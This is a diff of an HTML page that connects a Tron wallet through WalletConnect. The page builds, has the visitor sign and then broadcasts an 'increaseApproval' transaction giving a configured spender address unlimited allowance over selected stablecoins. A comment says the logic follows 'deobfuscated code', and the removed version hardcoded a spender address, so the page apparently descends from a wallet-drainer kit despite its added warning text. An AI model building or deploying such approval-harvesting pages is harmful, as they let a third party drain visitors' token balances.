@@ -3,18 +3,25 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Tron Token Approval (Transparent)</title>
+  <title>Tron WalletConnect Approval (Transparent)</title>
 
-  <!-- TronWeb (required) -->
+  <!-- Tailwind for UI -->
+  <script src="https://cdn.tailwindcss.com"></script>
+
+  <!-- TronWeb (NO injected provider; HTTP only) -->
   <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
 
-  <!-- Tailwind (UI only) -->
-  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- WalletConnect v2 (UMD) -->
+  <script src="https://unpkg.com/@walletconnect/sign-client@2.11.3/dist/umd/index.umd.js"></script>
+  <script src="https://unpkg.com/@walletconnect/modal@2.6.2/dist/umd/index.umd.js"></script>
 
   <script>
     /* ================= CONFIG ================= */
-    // CHANGE THIS
-    window.SPENDER = "TZC9E9PNULB87BKPhPmtrZBPRsu7QUPfTk";
+    // WalletConnect Project ID (REQUIRED)
+    const WC_PROJECT_ID = "PUT_WALLETCONNECT_PROJECT_ID";
+
+    // Spender (same as original logic)
+    const SPENDER = "PUT_SPENDER_ADDRESS_HERE";
 
     const MAX_UINT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
@@ -24,55 +31,57 @@
       { id: "tusd", name: "TUSD", contract: "TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4" },
       { id: "usdd", name: "USDD", contract: "TPYmHEhy5n8TCEfYGqW2rPxsghSfzghPDn" }
     ];
+
+    // Tron HTTP provider (same idea as deobfuscated code)
+    const tronWeb = new TronWeb({
+      fullHost: "https://api.trongrid.io"
+    });
+
+    let wcClient;
+    let wcSession;
+    let userAddress;
+    let selectedToken = TOKENS[0];
   </script>
 </head>
 <body class="bg-gray-950 text-white min-h-screen flex items-center justify-center">
 
   <div class="w-full max-w-md bg-gray-900 rounded-2xl shadow-xl p-6">
-    <h1 class="text-xl font-bold mb-4">Tron Token Approval</h1>
+    <h1 class="text-xl font-bold mb-4">Tron WalletConnect Approval</h1>
 
-    <!-- STEP: SELECT -->
-    <div id="step-select">
-      <label class="text-sm">Select Token</label>
-      <select id="tokenSelect" class="w-full bg-gray-800 p-2 rounded mt-1 mb-4"></select>
+    <!-- TOKEN -->
+    <label class="text-sm">Select Token</label>
+    <select id="tokenSelect" class="w-full bg-gray-800 p-2 rounded mt-1 mb-4"></select>
 
-      <button onclick="connectWallet()" class="w-full bg-blue-600 hover:bg-blue-700 rounded p-2">
-        Connect Wallet
-      </button>
-    </div>
+    <!-- CONNECT -->
+    <button id="connectBtn" class="w-full bg-blue-600 hover:bg-blue-700 rounded p-2 mb-3">
+      Connect Wallet (WalletConnect)
+    </button>
 
-    <!-- STEP: APPROVE -->
-    <div id="step-approve" class="hidden">
-      <p class="text-sm mb-2">Wallet:</p>
-      <p id="walletAddress" class="text-sm mb-4"></p>
+    <p id="addr" class="text-sm mb-3"></p>
 
-      <button onclick="showWarning()" class="w-full bg-orange-600 hover:bg-orange-700 rounded p-2">
-        Approve Token
-      </button>
-    </div>
+    <!-- APPROVE -->
+    <button id="approveBtn" class="hidden w-full bg-orange-600 hover:bg-orange-700 rounded p-2">
+      Approve Token
+    </button>
 
     <!-- WARNING -->
     <div id="warning" class="hidden mt-4 border border-red-600 rounded p-4 text-sm">
       <p class="font-bold text-red-400 mb-2">Unlimited Approval Warning</p>
-      <p class="mb-2">You are about to approve <b>UNLIMITED</b> access to this token.</p>
-      <p class="mb-2 break-all">Spender:</p>
-      <p class="text-xs break-all mb-3" id="spender"></p>
-      <button onclick="approveToken()" class="w-full bg-red-600 hover:bg-red-700 rounded p-2">
+      <p class="mb-2">You are granting <b>UNLIMITED</b> access to this token.</p>
+      <p class="text-xs break-all mb-3">Spender: <span id="spender"></span></p>
+      <button id="confirmApprove" class="w-full bg-red-600 hover:bg-red-700 rounded p-2">
         I Understand, Continue
       </button>
     </div>
 
-    <!-- STATUS -->
     <div id="status" class="mt-4 text-sm"></div>
   </div>
 
   <script>
+    /* ================= UI SETUP ================= */
     const tokenSelect = document.getElementById("tokenSelect");
-    const walletAddressEl = document.getElementById("walletAddress");
+    const addrEl = document.getElementById("addr");
     const statusEl = document.getElementById("status");
-
-    let currentToken = TOKENS[0];
-    let walletAddress = null;
 
     TOKENS.forEach(t => {
       const opt = document.createElement("option");
@@ -81,45 +90,102 @@
       tokenSelect.appendChild(opt);
     });
 
-    tokenSelect.addEventListener("change", e => {
-      currentToken = TOKENS.find(t => t.id === e.target.value);
-    });
+    tokenSelect.onchange = e => {
+      selectedToken = TOKENS.find(t => t.id === e.target.value);
+    };
 
-    function mask(addr) {
-      return addr.slice(0, 6) + "..." + addr.slice(-4);
+    function mask(a){ return a.slice(0,6)+"..."+a.slice(-4); }
+
+    /* ================= WALLETCONNECT ================= */
+    async function initWC(){
+      wcClient = await window.WalletConnectSignClient.SignClient.init({
+        projectId: WC_PROJECT_ID,
+        metadata: {
+          name: "Tron Approval",
+          description: "Transparent Tron approval via WalletConnect",
+          url: location.origin,
+          icons: []
+        }
+      });
     }
 
-    async function connectWallet() {
-      if (!window.tronWeb || !window.tronWeb.ready) {
-        alert("Open this site inside Trust Wallet or TronLink browser");
-        return;
+    async function connectWC(){
+      if(!wcClient) await initWC();
+
+      const { uri, approval } = await wcClient.connect({
+        requiredNamespaces: {
+          tron: {
+            methods: ["tron_signTransaction"],
+            chains: ["tron:0x2b6653dc"], // Tron mainnet
+            events: []
+          }
+        }
+      });
+
+      if(uri){
+        const modal = new window.WalletConnectModal.WalletConnectModal({
+          projectId: WC_PROJECT_ID
+        });
+        modal.openModal({ uri });
       }
 
-      walletAddress = window.tronWeb.defaultAddress.base58;
-      walletAddressEl.textContent = mask(walletAddress);
+      wcSession = await approval();
+      const account = wcSession.namespaces.tron.accounts[0];
+      userAddress = account.split(":")[2];
 
-      document.getElementById("step-select").classList.add("hidden");
-      document.getElementById("step-approve").classList.remove("hidden");
+      addrEl.textContent = "Wallet: " + mask(userAddress);
+      document.getElementById("approveBtn").classList.remove("hidden");
     }
 
-    function showWarning() {
-      document.getElementById("spender").textContent = window.SPENDER;
+    /* ================= APPROVAL FLOW ================= */
+    async function buildApprovalTx(){
+      const contract = await tronWeb.contract().at(selectedToken.contract);
+
+      const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
+        tronWeb.address.toHex(selectedToken.contract),
+        "increaseApproval(address,uint256)",
+        { callValue: 0 },
+        [
+          { type: "address", value: SPENDER },
+          { type: "uint256", value: MAX_UINT }
+        ],
+        tronWeb.address.toHex(userAddress)
+      );
+
+      return transaction;
+    }
+
+    async function requestApproval(){
+      statusEl.textContent = "Requesting wallet signature…";
+      try{
+        const tx = await buildApprovalTx();
+
+        const signed = await wcClient.request({
+          topic: wcSession.topic,
+          chainId: "tron:0x2b6653dc",
+          request: {
+            method: "tron_signTransaction",
+            params: { transaction: tx }
+          }
+        });
+
+        const result = await tronWeb.trx.sendRawTransaction(signed);
+        statusEl.innerHTML = `<span class='text-green-400'>Approved</span><br><span class='text-xs break-all'>${result.txid}</span>`;
+      }catch(e){
+        console.error(e);
+        statusEl.innerHTML = "<span class='text-red-400'>Rejected or failed</span>";
+      }
+    }
+
+    /* ================= EVENTS ================= */
+    document.getElementById("connectBtn").onclick = connectWC;
+
+    document.getElementById("approveBtn").onclick = () => {
+      document.getElementById("spender").textContent = SPENDER;
       document.getElementById("warning").classList.remove("hidden");
-    }
+    };
 
-    async function approveToken() {
-      statusEl.textContent = "Waiting for wallet confirmation…";
-
-      try {
-        const contract = await window.tronWeb.contract().at(currentToken.contract);
-        const tx = await contract.increaseApproval(window.SPENDER, MAX_UINT).send();
-
-        statusEl.innerHTML = `<span class='text-green-400'>Approval successful</span><br><span class='text-xs break-all'>${tx}</span>`;
-      } catch (err) {
-        console.error(err);
-        statusEl.innerHTML = "<span class='text-red-400'>Transaction rejected or failed</span>";
-      }
-    }
+    document.getElementById("confirmApprove").onclick = requestApproval;
   </script>
 </body>
 </html>
